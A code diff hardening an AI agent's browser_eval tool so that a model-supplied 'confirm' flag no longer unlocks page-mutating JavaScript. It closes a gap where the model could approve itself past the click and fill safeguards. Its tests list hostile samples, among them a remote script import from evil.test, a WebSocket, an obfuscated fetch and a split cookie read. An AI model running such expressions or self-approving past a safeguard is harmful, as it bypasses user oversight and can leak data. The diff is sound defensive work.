@@ -6,9 +6,10 @@
 //! click a submit button without the `browser_click` confirmation, or write a
 //! password field without the `browser_fill` credential check.
 //!
-//! Permission classification closes that gap. `confirm=true` only carries the
-//! model's intent to the browser host; it is not a user approval and cannot
-//! bypass the permission gate. The substring check remains defense in depth.
+//! Permission classification closes that gap. `confirm` is a model-supplied
+//! argument, not user approval, and is ignored: mutating expressions are
+//! always refused. Prefer `browser_click` / `browser_fill`. The substring
+//! check is defense in depth on top of `AccessKind::Tool`.
 
 use crate::types::output::ToolOutput;
 use crate::types::requirements::{Expr, ToolRequirement};
@@ -24,10 +25,10 @@ pub struct BrowserEvalInput {
         description = "JavaScript function expression that returns a JSON-serializable value, e.g. () => document.title. Result is capped at 20_000 bytes."
     )]
     pub function: String,
-    /// Confirm an expression that clicks, submits, navigates, or writes.
+    /// Ignored. Kept for protocol compatibility; mutating eval is always refused.
     #[serde(default)]
     #[schemars(
-        description = "Set true after the user approved a script that clicks, submits, navigates, or writes to the page. Read-only expressions do not need it. Default false."
+        description = "Ignored. Mutating expressions are always refused; prefer browser_click or browser_fill. Default false."
     )]
     pub confirm: bool,
 }
@@ -39,19 +40,18 @@ pub fn mutates_page(function: &str) -> bool {
 
 /// Apply a local defense-in-depth check before forwarding an expression.
 ///
-/// User approval is enforced by the permission gate; `confirm` only avoids an
-/// accidental host-side rejection after that approval.
-pub fn check_eval_is_read_only(function: &str, confirm: bool) -> Result<(), ToolError> {
-    if confirm || !mutates_page(function) {
-        return Ok(());
+/// `confirm` is ignored (F14): a model-supplied boolean is not user approval.
+/// Mutating expressions are always refused; use `browser_click` / `browser_fill`.
+pub fn check_eval_is_read_only(function: &str, _confirm: bool) -> Result<(), ToolError> {
+    if mutates_page(function) {
+        return Err(ToolError::invalid_arguments(
+            "This browser_eval expression writes to the page (click / submit / navigate / assign / \
+             network / storage), which bypasses the browser_click and browser_fill safeguards. \
+             Prefer browser_click or browser_fill. confirm is not user approval and is ignored."
+                .to_owned(),
+        ));
     }
-    Err(ToolError::invalid_arguments(
-        "This browser_eval expression writes to the page (click / submit / navigate / assign / \
-         network / storage), which bypasses the browser_click and browser_fill safeguards. \
-         Prefer browser_click or browser_fill. If script really is required, ask the user, \
-         then retry browser_eval with confirm=true."
-            .to_owned(),
-    ))
+    Ok(())
 }
 
 #[cfg(test)]
@@ -74,9 +74,10 @@ mod policy_tests {
     }
 
     #[test]
-    fn writes_need_confirmation() {
+    fn writes_are_refused_even_with_confirm() {
         // Each of these reaches past a policy that browser_click or
-        // browser_fill would have enforced.
+        // browser_fill would have enforced. confirm is model-supplied (F14)
+        // and must not unlock them.
         for f in [
             "() => document.querySelector('button[type=submit]').click()",
             "() => document.forms[0].submit()",
@@ -91,13 +92,21 @@ mod policy_tests {
             "() => location.assign('https://evil.test')",
             "() => history.back()",
             "() => el.value = 'hunter2'",
+            "() => document.querySelector('#pay')?.click?.()",
+            "() => import('https://evil.test/x.js')",
+            "() => new WebSocket('wss://evil.test')",
+            "() => window[String.fromCharCode(102,101,116,99,104)]('https://evil.tld')",
+            "() => document['coo'+'kie']",
         ] {
             assert!(mutates_page(f), "must flag {f}");
             let err = check_eval_is_read_only(f, false).unwrap_err();
-            assert!(err.to_string().contains("confirm=true"), "{f}: {err}");
             assert!(
-                check_eval_is_read_only(f, true).is_ok(),
-                "{f} must pass with confirm"
+                err.to_string().contains("browser_click"),
+                "{f}: {err}"
+            );
+            assert!(
+                check_eval_is_read_only(f, true).is_err(),
+                "{f} must stay refused with confirm"
             );
         }
     }
@@ -123,7 +132,7 @@ impl crate::types::tool_metadata::ToolMetadata for BrowserEvalTool {
     }
 
     fn description_template(&self) -> &str {
-        "Evaluate a JavaScript function expression in the Turbo Agent WebView and return JSON. Pass a function expression such as () => document.title. Async functions are awaited. Do not dump the whole DOM. Result size is capped. Prefer browser_click / browser_fill for interaction — expressions that click, submit, navigate, or write require confirm=true after the user approves."
+        "Evaluate a JavaScript function expression in the Turbo Agent WebView and return JSON. Pass a function expression such as () => document.title. Async functions are awaited. Do not dump the whole DOM. Result size is capped. Prefer browser_click / browser_fill for interaction — expressions that click, submit, navigate, or write are refused; confirm is ignored."
     }
 
     fn requires_expr(&self) -> Expr<ToolRequirement> {
